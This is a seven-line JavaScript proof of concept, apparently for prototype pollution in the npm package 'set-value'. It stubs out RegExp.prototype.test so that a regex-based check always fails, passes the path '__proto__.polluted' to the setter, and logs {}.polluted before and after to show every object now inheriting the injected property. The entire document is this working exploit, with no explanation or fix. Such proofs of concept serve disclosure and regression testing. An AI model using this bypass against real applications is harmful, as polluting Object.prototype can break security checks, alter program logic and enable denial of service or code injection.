RegExp.prototype.test = () => false;
const setFn = require('set-value');
const paths = ['__proto__.polluted'];
var obj = {};
console.log({}.polluted);
setFn({}, paths[0], 'yes');
console.log({}.polluted);